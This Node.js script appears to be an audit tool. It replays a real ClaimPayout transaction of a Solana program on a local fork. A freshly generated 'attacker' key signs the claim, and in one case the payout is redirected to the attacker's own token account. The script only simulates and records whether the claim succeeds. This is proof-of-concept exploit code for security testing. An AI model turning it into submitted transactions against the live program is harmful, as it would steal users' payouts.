#!/usr/bin/env node
// Replays a live market ClaimPayout shape against current binary on isolated fork.
// Fresh outsider signs locally. No transaction is submitted anywhere.
const fs=require('fs');
const modules='/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey,Keypair,TransactionInstruction,TransactionMessage,VersionedTransaction,SystemProgram}=require(modules+'@solana/web3.js');
const {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,createAssociatedTokenAccountIdempotentInstruction}=require(modules+'@solana/spl-token');
const bs58mod=require(modules+'bs58'),bs58=bs58mod.default||bs58mod;
const program='3ZZuTbwC6aJbvteyVxXUS7gtFYdf7AuXeitx6VyvjvUp';
const signature='3nNFqDdGfKjWjot2jUCxBzLwifAvafZcvBDR7HJkqzAtjtqRJpF8Vma6CTGejKAPmoxyvwR4YzjMsn5wZN7CUYbP';
const mint=new PublicKey('JuprjznTrTSp2UFa3ZBUFgwdAmtZCq4MQCwysN55USD');
const env=Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env','utf8')
 .split('\n').filter(Boolean).map(x=>x.split(/=(.*)/s).slice(0,2)));
const mainnet=env.HEAVY_RPC_URL||env.RPC_URL;
const fork='http://127.0.0.1:9397';
let id=0;
async function rpc(url,method,params){
 const r=await fetch(url,{method:'POST',headers:{'content-type':'application/json'},
  body:JSON.stringify({jsonrpc:'2.0',id:++id,method,params})});
 const j=await r.json();if(j.error)throw Error(method+': '+JSON.stringify(j.error));return j.result;
}
async function main(){
 const tx=await rpc(mainnet,'getTransaction',[signature,
  {encoding:'jsonParsed',commitment:'confirmed',maxSupportedTransactionVersion:1}]);
 if(!tx||tx.meta.err)throw Error('historical payout unavailable');
 const original=tx.transaction.message.instructions.find(x=>x.programId===program);
 const oldSigner=tx.transaction.message.accountKeys.find(x=>x.signer).pubkey;
 const flags=Object.fromEntries(tx.transaction.message.accountKeys.map(x=>[x.pubkey,x]));
 const attacker=Keypair.generate(),destination=getAssociatedTokenAddressSync(mint,attacker.publicKey,false,TOKEN_PROGRAM_ID);
 await rpc(fork,'surfnet_setAccount',[attacker.publicKey.toBase58(),{
  data:'',executable:false,lamports:1_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
 await rpc(fork,'getMultipleAccounts',[original.accounts,{encoding:'base64',commitment:'processed'}]);
 const cases=[{label:'fresh_signer_original_destination',redirect:false},
  {label:'fresh_signer_attacker_destination',redirect:true}];
 const results=[];
 for(const c of cases){
  const keys=original.accounts.map((s,i)=>({
   pubkey:new PublicKey(i===0?attacker.publicKey.toBase58():(c.redirect&&i===4?destination.toBase58():s)),
   isSigner:!!flags[s]?.signer,isWritable:!!flags[s]?.writable}));
  const ix=new TransactionInstruction({programId:new PublicKey(program),keys,data:Buffer.from(bs58.decode(original.data))});
  const instructions=c.redirect
   ?[createAssociatedTokenAccountIdempotentInstruction(attacker.publicKey,destination,attacker.publicKey,mint),ix]
   :[ix];
  const blockhash=(await rpc(fork,'getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
  const message=new TransactionMessage({payerKey:attacker.publicKey,recentBlockhash:blockhash,
   instructions}).compileToV0Message();
  const signed=new VersionedTransaction(message);signed.sign([attacker]);
  const wire=Buffer.from(signed.serialize());
  const sim=await rpc(fork,'simulateTransaction',[wire.toString('base64'),{
   encoding:'base64',sigVerify:true,replaceRecentBlockhash:false,commitment:'processed',
   accounts:{encoding:'base64',addresses:[original.accounts[5],original.accounts[4],destination.toBase58()]}}]);
  const result={label:c.label,err:sim.value.err,bytes:wire.length,accountKeys:message.staticAccountKeys.length,
   unitsConsumed:sim.value.unitsConsumed,logs:sim.value.logs};
  results.push(result);
  console.log(JSON.stringify({label:result.label,err:result.err,bytes:result.bytes,
   accountKeys:result.accountKeys,errorLog:result.logs?.find(x=>x.includes('Error')||x.includes('error'))}));
 }
 fs.writeFileSync(__dirname+'/jupusd-claim-outsider-signed-screen.json',JSON.stringify({
  generatedAt:new Date().toISOString(),program,sourceSignature:signature,sourceSlot:tx.slot,
  attacker:attacker.publicKey.toBase58(),sourceVault:original.accounts[5],sourcePosition:original.accounts[2],
  originalRecipient:oldSigner,attackerDestination:destination.toBase58(),sigVerify:true,
  mainnetSubmitted:false,forkSubmitted:false,results},null,2)+'\n');
}
main().catch(e=>{console.error(e.stack||e);process.exitCode=1});
